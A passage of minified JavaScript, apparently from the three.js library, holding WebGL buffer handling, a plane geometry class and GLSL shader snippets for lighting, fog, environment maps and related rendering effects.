Uint8ClampedArray)x=i.UNSIGNED_BYTE;else throw new Error("THREE.WebGLAttributes: Unsupported buffer data format: "+h);return{buffer:E,type:x,bytesPerElement:h.BYTES_PER_ELEMENT,version:c.version,size:m}}function s(c,u,h){const p=u.array,m=u._updateRange,E=u.updateRanges;if(i.bindBuffer(h,c),m.count===-1&&E.length===0&&i.bufferSubData(h,0,p),E.length!==0){for(let x=0,f=E.length;x<f;x++){const d=E[x];e?i.bufferSubData(h,d.start*p.BYTES_PER_ELEMENT,p,d.start,d.count):i.bufferSubData(h,d.start*p.BYTES_PER_ELEMENT,p.subarray(d.start,d.start+d.count))}u.clearUpdateRanges()}m.count!==-1&&(e?i.bufferSubData(h,m.offset*p.BYTES_PER_ELEMENT,p,m.offset,m.count):i.bufferSubData(h,m.offset*p.BYTES_PER_ELEMENT,p.subarray(m.offset,m.offset+m.count)),m.count=-1),u.onUploadCallback()}function o(c){return c.isInterleavedBufferAttribute&&(c=c.data),n.get(c)}function a(c){c.isInterleavedBufferAttribute&&(c=c.data);const u=n.get(c);u&&(i.deleteBuffer(u.buffer),n.delete(c))}function l(c,u){if(c.isGLBufferAttribute){const p=n.get(c);(!p||p.version<c.version)&&n.set(c,{buffer:c.buffer,type:c.type,bytesPerElement:c.elementSize,version:c.version});return}c.isInterleavedBufferAttribute&&(c=c.data);const h=n.get(c);if(h===void 0)n.set(c,r(c,u));else if(h.version<c.version){if(h.size!==c.array.byteLength)throw new Error("THREE.WebGLAttributes: The size of the buffer attribute's array buffer does not match the original size. Resizing buffer attributes is not supported.");s(h.buffer,c,u),h.version=c.version}}return{get:o,remove:a,update:l}}class ds extends Ie{constructor(t=1,e=1,n=1,r=1){super(),this.type="PlaneGeometry",this.parameters={width:t,height:e,widthSegments:n,heightSegments:r};const s=t/2,o=e/2,a=Math.floor(n),l=Math.floor(r),c=a+1,u=l+1,h=t/a,p=e/l,m=[],E=[],x=[],f=[];for(let d=0;d<u;d++){const g=d*p-o;for(let _=0;_<c;_++){const v=_*h-s;E.push(v,-g,0),x.push(0,0,1),f.push(_/a),f.push(1-d/l)}}for(let d=0;d<l;d++)for(let g=0;g<a;g++){const _=g+c*d,v=g+c*(d+1),w=g+1+c*(d+1),S=g+1+c*d;m.push(_,v,S),m.push(v,w,S)}this.setIndex(m),this.setAttribute("position",new de(E,3)),this.setAttribute("normal",new de(x,3)),this.setAttribute("uv",new de(f,2))}copy(t){return super.copy(t),this.parameters=Object.assign({},t.parameters),this}static fromJSON(t){return new ds(t.width,t.height,t.widthSegments,t.heightSegments)}}var hc=`#ifdef USE_ALPHAHASH
	if ( diffuseColor.a < getAlphaHashThreshold( vPosition ) ) discard;
#endif`,mc=`#ifdef USE_ALPHAHASH
	const float ALPHA_HASH_SCALE = 0.05;
	float hash2D( vec2 value ) {
		return fract( 1.0e4 * sin( 17.0 * value.x + 0.1 * value.y ) * ( 0.1 + abs( sin( 13.0 * value.y + value.x ) ) ) );
	}
	float hash3D( vec3 value ) {
		return hash2D( vec2( hash2D( value.xy ), value.z ) );
	}
	float getAlphaHashThreshold( vec3 position ) {
		float maxDeriv = max(
			length( dFdx( position.xyz ) ),
			length( dFdy( position.xyz ) )
		);
		float pixScale = 1.0 / ( ALPHA_HASH_SCALE * maxDeriv );
		vec2 pixScales = vec2(
			exp2( floor( log2( pixScale ) ) ),
			exp2( ceil( log2( pixScale ) ) )
		);
		vec2 alpha = vec2(
			hash3D( floor( pixScales.x * position.xyz ) ),
			hash3D( floor( pixScales.y * position.xyz ) )
		);
		float lerpFactor = fract( log2( pixScale ) );
		float x = ( 1.0 - lerpFactor ) * alpha.x + lerpFactor * alpha.y;
		float a = min( lerpFactor, 1.0 - lerpFactor );
		vec3 cases = vec3(
			x * x / ( 2.0 * a * ( 1.0 - a ) ),
			( x - 0.5 * a ) / ( 1.0 - a ),
			1.0 - ( ( 1.0 - x ) * ( 1.0 - x ) / ( 2.0 * a * ( 1.0 - a ) ) )
		);
		float threshold = ( x < ( 1.0 - a ) )
			? ( ( x < a ) ? cases.x : cases.y )
			: cases.z;
		return clamp( threshold , 1.0e-6, 1.0 );
	}
#endif`,_c=`#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, vAlphaMapUv ).g;
#endif`,gc=`#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,vc=`#ifdef USE_ALPHATEST
	if ( diffuseColor.a < alphaTest ) discard;
#endif`,xc=`#ifdef USE_ALPHATEST
	uniform float alphaTest;
#endif`,Ec=`#ifdef USE_AOMAP
	float ambientOcclusion = ( texture2D( aoMap, vAoMapUv ).r - 1.0 ) * aoMapIntensity + 1.0;
	reflectedLight.indirectDiffuse *= ambientOcclusion;
	#if defined( USE_CLEARCOAT ) 
		clearcoatSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_SHEEN ) 
		sheenSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD )
		float dotNV = saturate( dot( geometryNormal, geometryViewDir ) );
		reflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.roughness );
	#endif
#endif`,yc=`#ifdef USE_AOMAP
	uniform sampler2D aoMap;
	uniform float aoMapIntensity;
#endif`,Mc=`#ifdef USE_BATCHING
	attribute float batchId;
	uniform highp sampler2D batchingTexture;
	mat4 getBatchingMatrix( const in float i ) {
		int size = textureSize( batchingTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( batchingTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( batchingTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( batchingTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( batchingTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,Sc=`#ifdef USE_BATCHING
	mat4 batchingMatrix = getBatchingMatrix( batchId );
#endif`,bc=`vec3 transformed = vec3( position );
#ifdef USE_ALPHAHASH
	vPosition = vec3( position );
#endif`,Tc=`vec3 objectNormal = vec3( normal );
#ifdef USE_TANGENT
	vec3 objectTangent = vec3( tangent.xyz );
#endif`,Ac=`float G_BlinnPhong_Implicit( ) {
	return 0.25;
}
float D_BlinnPhong( const in float shininess, const in float dotNH ) {
	return RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );
}
vec3 BRDF_BlinnPhong( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float shininess ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( specularColor, 1.0, dotVH );
	float G = G_BlinnPhong_Implicit( );
	float D = D_BlinnPhong( shininess, dotNH );
	return F * ( G * D );
} // validated`,Rc=`#ifdef USE_IRIDESCENCE
	const mat3 XYZ_TO_REC709 = mat3(
		 3.2404542, -0.9692660,  0.0556434,
		-1.5371385,  1.8760108, -0.2040259,
		-0.4985314,  0.0415560,  1.0572252
	);
	vec3 Fresnel0ToIor( vec3 fresnel0 ) {
		vec3 sqrtF0 = sqrt( fresnel0 );
		return ( vec3( 1.0 ) + sqrtF0 ) / ( vec3( 1.0 ) - sqrtF0 );
	}
	vec3 IorToFresnel0( vec3 transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - vec3( incidentIor ) ) / ( transmittedIor + vec3( incidentIor ) ) );
	}
	float IorToFresnel0( float transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - incidentIor ) / ( transmittedIor + incidentIor ));
	}
	vec3 evalSensitivity( float OPD, vec3 shift ) {
		float phase = 2.0 * PI * OPD * 1.0e-9;
		vec3 val = vec3( 5.4856e-13, 4.4201e-13, 5.2481e-13 );
		vec3 pos = vec3( 1.6810e+06, 1.7953e+06, 2.2084e+06 );
		vec3 var = vec3( 4.3278e+09, 9.3046e+09, 6.6121e+09 );
		vec3 xyz = val * sqrt( 2.0 * PI * var ) * cos( pos * phase + shift ) * exp( - pow2( phase ) * var );
		xyz.x += 9.7470e-14 * sqrt( 2.0 * PI * 4.5282e+09 ) * cos( 2.2399e+06 * phase + shift[ 0 ] ) * exp( - 4.5282e+09 * pow2( phase ) );
		xyz /= 1.0685e-7;
		vec3 rgb = XYZ_TO_REC709 * xyz;
		return rgb;
	}
	vec3 evalIridescence( float outsideIOR, float eta2, float cosTheta1, float thinFilmThickness, vec3 baseF0 ) {
		vec3 I;
		float iridescenceIOR = mix( outsideIOR, eta2, smoothstep( 0.0, 0.03, thinFilmThickness ) );
		float sinTheta2Sq = pow2( outsideIOR / iridescenceIOR ) * ( 1.0 - pow2( cosTheta1 ) );
		float cosTheta2Sq = 1.0 - sinTheta2Sq;
		if ( cosTheta2Sq < 0.0 ) {
			return vec3( 1.0 );
		}
		float cosTheta2 = sqrt( cosTheta2Sq );
		float R0 = IorToFresnel0( iridescenceIOR, outsideIOR );
		float R12 = F_Schlick( R0, 1.0, cosTheta1 );
		float T121 = 1.0 - R12;
		float phi12 = 0.0;
		if ( iridescenceIOR < outsideIOR ) phi12 = PI;
		float phi21 = PI - phi12;
		vec3 baseIOR = Fresnel0ToIor( clamp( baseF0, 0.0, 0.9999 ) );		vec3 R1 = IorToFresnel0( baseIOR, iridescenceIOR );
		vec3 R23 = F_Schlick( R1, 1.0, cosTheta2 );
		vec3 phi23 = vec3( 0.0 );
		if ( baseIOR[ 0 ] < iridescenceIOR ) phi23[ 0 ] = PI;
		if ( baseIOR[ 1 ] < iridescenceIOR ) phi23[ 1 ] = PI;
		if ( baseIOR[ 2 ] < iridescenceIOR ) phi23[ 2 ] = PI;
		float OPD = 2.0 * iridescenceIOR * thinFilmThickness * cosTheta2;
		vec3 phi = vec3( phi21 ) + phi23;
		vec3 R123 = clamp( R12 * R23, 1e-5, 0.9999 );
		vec3 r123 = sqrt( R123 );
		vec3 Rs = pow2( T121 ) * R23 / ( vec3( 1.0 ) - R123 );
		vec3 C0 = R12 + Rs;
		I = C0;
		vec3 Cm = Rs - T121;
		for ( int m = 1; m <= 2; ++ m ) {
			Cm *= r123;
			vec3 Sm = 2.0 * evalSensitivity( float( m ) * OPD, float( m ) * phi );
			I += Cm * Sm;
		}
		return max( I, vec3( 0.0 ) );
	}
#endif`,wc=`#ifdef USE_BUMPMAP
	uniform sampler2D bumpMap;
	uniform float bumpScale;
	vec2 dHdxy_fwd() {
		vec2 dSTdx = dFdx( vBumpMapUv );
		vec2 dSTdy = dFdy( vBumpMapUv );
		float Hll = bumpScale * texture2D( bumpMap, vBumpMapUv ).x;
		float dBx = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdx ).x - Hll;
		float dBy = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdy ).x - Hll;
		return vec2( dBx, dBy );
	}
	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {
		vec3 vSigmaX = normalize( dFdx( surf_pos.xyz ) );
		vec3 vSigmaY = normalize( dFdy( surf_pos.xyz ) );
		vec3 vN = surf_norm;
		vec3 R1 = cross( vSigmaY, vN );
		vec3 R2 = cross( vN, vSigmaX );
		float fDet = dot( vSigmaX, R1 ) * faceDirection;
		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );
		return normalize( abs( fDet ) * surf_norm - vGrad );
	}
#endif`,Cc=`#if NUM_CLIPPING_PLANES > 0
	vec4 plane;
	#pragma unroll_loop_start
	for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
		plane = clippingPlanes[ i ];
		if ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;
	}
	#pragma unroll_loop_end
	#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
		bool clipped = true;
		#pragma unroll_loop_start
		for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			clipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;
		}
		#pragma unroll_loop_end
		if ( clipped ) discard;
	#endif
#endif`,Pc=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
	uniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];
#endif`,Ic=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
#endif`,Lc=`#if NUM_CLIPPING_PLANES > 0
	vClipPosition = - mvPosition.xyz;
#endif`,Dc=`#if defined( USE_COLOR_ALPHA )
	diffuseColor *= vColor;
#elif defined( USE_COLOR )
	diffuseColor.rgb *= vColor;
#endif`,Nc=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR )
	varying vec3 vColor;
#endif`,Uc=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )
	varying vec3 vColor;
#endif`,Oc=`#if defined( USE_COLOR_ALPHA )
	vColor = vec4( 1.0 );
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )
	vColor = vec3( 1.0 );
#endif
#ifdef USE_COLOR
	vColor *= color;
#endif
#ifdef USE_INSTANCING_COLOR
	vColor.xyz *= instanceColor.xyz;
#endif`,Fc=`#define PI 3.141592653589793
#define PI2 6.283185307179586
#define PI_HALF 1.5707963267948966
#define RECIPROCAL_PI 0.3183098861837907
#define RECIPROCAL_PI2 0.15915494309189535
#define EPSILON 1e-6
#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
#define whiteComplement( a ) ( 1.0 - saturate( a ) )
float pow2( const in float x ) { return x*x; }
vec3 pow2( const in vec3 x ) { return x*x; }
float pow3( const in float x ) { return x*x*x; }
float pow4( const in float x ) { float x2 = x*x; return x2*x2; }
float max3( const in vec3 v ) { return max( max( v.x, v.y ), v.z ); }
float average( const in vec3 v ) { return dot( v, vec3( 0.3333333 ) ); }
highp float rand( const in vec2 uv ) {
	const highp float a = 12.9898, b = 78.233, c = 43758.5453;
	highp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );
	return fract( sin( sn ) * c );
}
#ifdef HIGH_PRECISION
	float precisionSafeLength( vec3 v ) { return length( v ); }
#else
	float precisionSafeLength( vec3 v ) {
		float maxComponent = max3( abs( v ) );
		return length( v / maxComponent ) * maxComponent;
	}
#endif
struct IncidentLight {
	vec3 color;
	vec3 direction;
	bool visible;
};
struct ReflectedLight {
	vec3 directDiffuse;
	vec3 directSpecular;
	vec3 indirectDiffuse;
	vec3 indirectSpecular;
};
#ifdef USE_ALPHAHASH
	varying vec3 vPosition;
#endif
vec3 transformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );
}
vec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );
}
mat3 transposeMat3( const in mat3 m ) {
	mat3 tmp;
	tmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );
	tmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );
	tmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );
	return tmp;
}
float luminance( const in vec3 rgb ) {
	const vec3 weights = vec3( 0.2126729, 0.7151522, 0.0721750 );
	return dot( weights, rgb );
}
bool isPerspectiveMatrix( mat4 m ) {
	return m[ 2 ][ 3 ] == - 1.0;
}
vec2 equirectUv( in vec3 dir ) {
	float u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;
	float v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;
	return vec2( u, v );
}
vec3 BRDF_Lambert( const in vec3 diffuseColor ) {
	return RECIPROCAL_PI * diffuseColor;
}
vec3 F_Schlick( const in vec3 f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
}
float F_Schlick( const in float f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
} // validated`,kc=`#ifdef ENVMAP_TYPE_CUBE_UV
	#define cubeUV_minMipLevel 4.0
	#define cubeUV_minTileSize 16.0
	float getFace( vec3 direction ) {
		vec3 absDirection = abs( direction );
		float face = - 1.0;
		if ( absDirection.x > absDirection.z ) {
			if ( absDirection.x > absDirection.y )
				face = direction.x > 0.0 ? 0.0 : 3.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		} else {
			if ( absDirection.z > absDirection.y )
				face = direction.z > 0.0 ? 2.0 : 5.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		}
		return face;
	}
	vec2 getUV( vec3 direction, float face ) {
		vec2 uv;
		if ( face == 0.0 ) {
			uv = vec2( direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 1.0 ) {
			uv = vec2( - direction.x, - direction.z ) / abs( direction.y );
		} else if ( face == 2.0 ) {
			uv = vec2( - direction.x, direction.y ) / abs( direction.z );
		} else if ( face == 3.0 ) {
			uv = vec2( - direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 4.0 ) {
			uv = vec2( - direction.x, direction.z ) / abs( direction.y );
		} else {
			uv = vec2( direction.x, direction.y ) / abs( direction.z );
		}
		return 0.5 * ( uv + 1.0 );
	}
	vec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {
		float face = getFace( direction );
		float filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );
		mipInt = max( mipInt, cubeUV_minMipLevel );
		float faceSize = exp2( mipInt );
		highp vec2 uv = getUV( direction, face ) * ( faceSize - 2.0 ) + 1.0;
		if ( face > 2.0 ) {
			uv.y += faceSize;
			face -= 3.0;
		}
		uv.x += face * faceSize;
		uv.x += filterInt * 3.0 * cubeUV_minTileSize;
		uv.y += 4.0 * ( exp2( CUBEUV_MAX_MIP ) - faceSize );
		uv.x *= CUBEUV_TEXEL_WIDTH;
		uv.y *= CUBEUV_TEXEL_HEIGHT;
		#ifdef texture2DGradEXT
			return texture2DGradEXT( envMap, uv, vec2( 0.0 ), vec2( 0.0 ) ).rgb;
		#else
			return texture2D( envMap, uv ).rgb;
		#endif
	}
	#define cubeUV_r0 1.0
	#define cubeUV_m0 - 2.0
	#define cubeUV_r1 0.8
	#define cubeUV_m1 - 1.0
	#define cubeUV_r4 0.4
	#define cubeUV_m4 2.0
	#define cubeUV_r5 0.305
	#define cubeUV_m5 3.0
	#define cubeUV_r6 0.21
	#define cubeUV_m6 4.0
	float roughnessToMip( float roughness ) {
		float mip = 0.0;
		if ( roughness >= cubeUV_r1 ) {
			mip = ( cubeUV_r0 - roughness ) * ( cubeUV_m1 - cubeUV_m0 ) / ( cubeUV_r0 - cubeUV_r1 ) + cubeUV_m0;
		} else if ( roughness >= cubeUV_r4 ) {
			mip = ( cubeUV_r1 - roughness ) * ( cubeUV_m4 - cubeUV_m1 ) / ( cubeUV_r1 - cubeUV_r4 ) + cubeUV_m1;
		} else if ( roughness >= cubeUV_r5 ) {
			mip = ( cubeUV_r4 - roughness ) * ( cubeUV_m5 - cubeUV_m4 ) / ( cubeUV_r4 - cubeUV_r5 ) + cubeUV_m4;
		} else if ( roughness >= cubeUV_r6 ) {
			mip = ( cubeUV_r5 - roughness ) * ( cubeUV_m6 - cubeUV_m5 ) / ( cubeUV_r5 - cubeUV_r6 ) + cubeUV_m5;
		} else {
			mip = - 2.0 * log2( 1.16 * roughness );		}
		return mip;
	}
	vec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {
		float mip = clamp( roughnessToMip( roughness ), cubeUV_m0, CUBEUV_MAX_MIP );
		float mipF = fract( mip );
		float mipInt = floor( mip );
		vec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );
		if ( mipF == 0.0 ) {
			return vec4( color0, 1.0 );
		} else {
			vec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );
			return vec4( mix( color0, color1, mipF ), 1.0 );
		}
	}
#endif`,Bc=`vec3 transformedNormal = objectNormal;
#ifdef USE_TANGENT
	vec3 transformedTangent = objectTangent;
#endif
#ifdef USE_BATCHING
	mat3 bm = mat3( batchingMatrix );
	transformedNormal /= vec3( dot( bm[ 0 ], bm[ 0 ] ), dot( bm[ 1 ], bm[ 1 ] ), dot( bm[ 2 ], bm[ 2 ] ) );
	transformedNormal = bm * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = bm * transformedTangent;
	#endif
#endif
#ifdef USE_INSTANCING
	mat3 im = mat3( instanceMatrix );
	transformedNormal /= vec3( dot( im[ 0 ], im[ 0 ] ), dot( im[ 1 ], im[ 1 ] ), dot( im[ 2 ], im[ 2 ] ) );
	transformedNormal = im * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = im * transformedTangent;
	#endif
#endif
transformedNormal = normalMatrix * transformedNormal;
#ifdef FLIP_SIDED
	transformedNormal = - transformedNormal;
#endif
#ifdef USE_TANGENT
	transformedTangent = ( modelViewMatrix * vec4( transformedTangent, 0.0 ) ).xyz;
	#ifdef FLIP_SIDED
		transformedTangent = - transformedTangent;
	#endif
#endif`,zc=`#ifdef USE_DISPLACEMENTMAP
	uniform sampler2D displacementMap;
	uniform float displacementScale;
	uniform float displacementBias;
#endif`,Gc=`#ifdef USE_DISPLACEMENTMAP
	transformed += normalize( objectNormal ) * ( texture2D( displacementMap, vDisplacementMapUv ).x * displacementScale + displacementBias );
#endif`,Hc=`#ifdef USE_EMISSIVEMAP
	vec4 emissiveColor = texture2D( emissiveMap, vEmissiveMapUv );
	totalEmissiveRadiance *= emissiveColor.rgb;
#endif`,Vc=`#ifdef USE_EMISSIVEMAP
	uniform sampler2D emissiveMap;
#endif`,Wc="gl_FragColor = linearToOutputTexel( gl_FragColor );",Xc=`
const mat3 LINEAR_SRGB_TO_LINEAR_DISPLAY_P3 = mat3(
	vec3( 0.8224621, 0.177538, 0.0 ),
	vec3( 0.0331941, 0.9668058, 0.0 ),
	vec3( 0.0170827, 0.0723974, 0.9105199 )
);
const mat3 LINEAR_DISPLAY_P3_TO_LINEAR_SRGB = mat3(
	vec3( 1.2249401, - 0.2249404, 0.0 ),
	vec3( - 0.0420569, 1.0420571, 0.0 ),
	vec3( - 0.0196376, - 0.0786361, 1.0982735 )
);
vec4 LinearSRGBToLinearDisplayP3( in vec4 value ) {
	return vec4( value.rgb * LINEAR_SRGB_TO_LINEAR_DISPLAY_P3, value.a );
}
vec4 LinearDisplayP3ToLinearSRGB( in vec4 value ) {
	return vec4( value.rgb * LINEAR_DISPLAY_P3_TO_LINEAR_SRGB, value.a );
}
vec4 LinearTransferOETF( in vec4 value ) {
	return value;
}
vec4 sRGBTransferOETF( in vec4 value ) {
	return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );
}
vec4 LinearToLinear( in vec4 value ) {
	return value;
}
vec4 LinearTosRGB( in vec4 value ) {
	return sRGBTransferOETF( value );
}`,qc=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vec3 cameraToFrag;
		if ( isOrthographic ) {
			cameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToFrag = normalize( vWorldPosition - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vec3 reflectVec = reflect( cameraToFrag, worldNormal );
		#else
			vec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );
		#endif
	#else
		vec3 reflectVec = vReflect;
	#endif
	#ifdef ENVMAP_TYPE_CUBE
		vec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );
	#else
		vec4 envColor = vec4( 0.0 );
	#endif
	#ifdef ENVMAP_BLENDING_MULTIPLY
		outgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_MIX )
		outgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_ADD )
		outgoingLight += envColor.xyz * specularStrength * reflectivity;
	#endif
#endif`,Yc=`#ifdef USE_ENVMAP
	uniform float envMapIntensity;
	uniform float flipEnvMap;
	#ifdef ENVMAP_TYPE_CUBE
		uniform samplerCube envMap;
	#else
		uniform sampler2D envMap;
	#endif
	
#endif`,jc=`#ifdef USE_ENVMAP
	uniform float reflectivity;
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		varying vec3 vWorldPosition;
		uniform float refractionRatio;
	#else
		varying vec3 vReflect;
	#endif
#endif`,$c=`#ifdef USE_ENVMAP
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		
		varying vec3 vWorldPosition;
	#else
		varying vec3 vReflect;
		uniform float refractionRatio;
	#endif
#endif`,Kc=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vWorldPosition = worldPosition.xyz;
	#else
		vec3 cameraToVertex;
		if ( isOrthographic ) {
			cameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToVertex = normalize( worldPosition.xyz - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vReflect = reflect( cameraToVertex, worldNormal );
		#else
			vReflect = refract( cameraToVertex, worldNormal, refractionRatio );
		#endif
	#endif
#endif`,Zc=`#ifdef USE_FOG
	vFogDepth = - mvPosition.z;
#endif`,Jc=`#ifdef USE_FOG
	varying float vFogDepth;
#endif`,Qc=`#ifdef USE_FOG
	#ifdef FOG_EXP2
		float fogFactor = 1.0 - exp( - fogDensity * fogDensity * vFogDepth * vFogDepth );
	#else
		float fogFactor = smoothstep( fogNear, fogFar, vFogDepth );
	#endif
	gl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );
#endif`,td=`#ifdef USE_FOG
	uniform vec3 fogColor;
	varying float vFogDepth;
	#ifdef FOG_EXP2
		uniform float fogDensity;
	#else
		uniform float fogNear;
		uniform float fogFar;
	#endif
#endif`,ed=`#ifdef USE_GRADIENTMAP
	uniform sampler2D gradientMap;
#endif
vec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {
	float dotNL = dot( normal, lightDirection );
	vec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );
	#ifdef USE_GRADIENTMAP
		return vec3( texture2D( gradientMap, coord ).r );
	#else
		vec2 fw = fwidth( coord ) * 0.5;
		return mix( vec3( 0.7 ), vec3( 1.0 ), smoothstep( 0.7 - fw.x, 0.7 + fw.x, coord.x ) );
	#endif
}`,nd=`#ifdef USE_LIGHTMAP
	vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
	vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
	reflectedLight.indirectDiffuse += lightMapIrradiance;
#endif`,id=`#ifdef USE_LIGHTMAP
	uniform sampler2D lightMap;
	uniform float lightMapIntensity;
#endif`,rd=`LambertMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularStrength = specularStrength;`,sd=`varying vec3 vViewPosition;
struct LambertMaterial {
	vec3 diffuseColor;
	float specularStrength;
};
void RE_Direct_Lambert( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Lambert( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Lambert
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Lambert`,ad=`uniform bool receiveShadow;
uniform vec3 ambientLightColor;
#if defined( USE_LIGHT_PROBES )
	uniform vec3 lightProbe[ 9 ];
#endif
vec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {
	float x = normal.x, y = normal.y, z = normal.z;
	vec3 result = shCoefficients[ 0 ] * 0.886227;
	result += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;
	result += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;
	result += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;
	result += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;
	result += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;
	result += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );
